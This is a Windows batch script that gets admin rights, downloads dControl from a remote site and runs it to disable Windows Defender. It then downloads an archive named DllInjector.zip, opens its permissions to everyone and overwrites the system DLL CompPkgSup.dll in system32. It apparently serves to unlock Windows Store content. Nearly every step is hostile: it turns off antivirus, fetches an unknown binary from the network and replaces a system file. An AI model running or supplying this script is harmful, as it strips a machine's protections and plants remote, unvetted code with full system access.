@echo off
title "Created By nixlos._. & itssomeguy."
color 05

:: Step 0: Ask for admin rights
whoami /groups | find "S-1-16-12288" >nul || (
    color 05
    echo [!] Admin Rights: Failed
    pause
    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)
color 05
echo [+] Admin Rights: Passed
echo.

:: Step 1: Download dControl.zip
set "dControlZipUrl=https://www.gedone.dev/wp-content/uploads/go-x/u/c5f4ee3b-a260-4209-b276-6f8f31e1a79c/dControl.zip"
set "dControlZipPath=%USERPROFILE%\Downloads\dControl.zip"
set "dControlPath=%USERPROFILE%\Downloads\dControl\dControl.exe"

echo Downloading dControl.zip from: %dControlZipUrl%
powershell -Command "Invoke-WebRequest -Uri '%dControlZipUrl%' -OutFile '%dControlZipPath%'"

:: Check if the dControl.zip was successfully downloaded
if exist "%dControlZipPath%" (
    color 05
    echo [+] Download dControl.zip: Passed
) else (
    color 05
    echo [!] Download dControl.zip: Failed
    pause
    exit /b
)

:: Step 2: Extract dControl.zip
echo Extracting dControl.zip...
powershell -Command "Expand-Archive -Path '%dControlZipPath%' -DestinationPath '%USERPROFILE%\Downloads\dControl'"

:: Check if dControl.exe was extracted successfully
if exist "%dControlPath%" (
    color 05
    echo [+] Extraction: Passed
) else (
    color 05
    echo [!] Extraction: Failed
    pause
    exit /b
)

:: Step 3: Disable Windows Defender using dControl (Command-Line, if possible)
echo [+] Attempting to disable Windows Defender using dControl.exe...
start "" "%dControlPath%" /disable
timeout /t 5 /nobreak >nul  :: Wait for dControl to disable Defender

:: Check if the Defender was successfully disabled (attempted method)
echo [+] Defender should now be disabled. Continuing with the script...

:: Step 4: Download DLL file
set "url=https://www.gedone.dev/wp-content/uploads/go-x/u/bcf1da18-9410-44c5-a260-4b787e945b5d/DllInjector.zip"
set "source=%USERPROFILE%\Downloads\CompPkgSup.dll"

echo Downloading required DLL file from: %url%
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%source%'"

:: Check if the DLL file was successfully downloaded
if exist "%source%" (
    color 05
    echo [+] Download File: Passed
) else (
    color 05
    echo [!] Download File: Failed
    pause
    exit /b
)

timeout /t 2 /nobreak >nul

:: Step 5: Configure DLL Permissions
echo [+] Configuring DLL permissions...
icacls "%source%" /grant Everyone:F >nul

:: Step 5.1: Rename original DLL
setlocal enabledelayedexpansion
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "dllName="
for /l %%i in (1,1,10) do (
    set /a "rand=!random! %% 62"
    for %%j in (!rand!) do set "dllName=!dllName!!chars:~%%j,1!"
)
set "randomDllName=!dllName!.dll"
echo [+] Renamed DLL: %randomDllName%

:: Step 6: Move modified DLL into system32
set "system32Path=%windir%\system32"
set "destination=%system32Path%\CompPkgSup.dll"

echo [+] Moving DLL to system32...
move /y "%source%" "%destination%"
if %errorlevel% equ 0 (
    color 05
    echo [+] Move File: Passed
) else (
    color 05
    echo [!] Move File: Failed
    pause
    exit /b
)

:: Step 7: Run SFC /scannow as Administrator in a separate command window
echo [+] Starting System File Checker (sfc /scannow) as Administrator...
start "" powershell -Command "Start-Process cmd -ArgumentList '/c sfc /scannow' -Verb RunAs"

pause
